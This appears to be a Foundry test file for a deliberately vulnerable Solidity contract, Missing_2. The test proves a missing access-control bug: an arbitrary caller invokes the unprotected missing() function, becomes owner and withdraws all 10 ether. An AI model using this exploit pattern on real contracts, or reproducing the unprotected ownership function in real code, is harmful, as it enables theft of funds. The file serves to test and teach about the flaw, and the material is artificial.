
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Missing_2} from "../src/Missing_2.sol";

contract TestAccessControlMissing_2 is Test {
    Missing_2 public _contractUnderTest;

    function setUp() public {
        _contractUnderTest = new Missing_2();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));

        // Exclude Foundry Internals
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);

        // --- 2. State Configuration ---
        // Fund the contract so we can verify the vulnerability allows withdrawal
        vm.deal(address(_contractUnderTest), 10 ether);
        
        // Store caller's initial balance to verify withdrawal works
        uint256 callerInitialBalance = caller.balance;

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // TRIGGER VULNERABILITY: Call the unprotected missing() function
        // This function lacks access control and allows anyone to become the owner
        _contractUnderTest.missing();

        // Now the caller should be the owner and can withdraw all funds
        vm.prank(caller);
        _contractUnderTest.withdraw();

        // Assert that the caller successfully withdrew the funds
        // This proves the vulnerability: an arbitrary user became owner and stole funds
        assertEq(caller.balance, callerInitialBalance + 10 ether);
        assertEq(address(_contractUnderTest).balance, 0);
    }
}
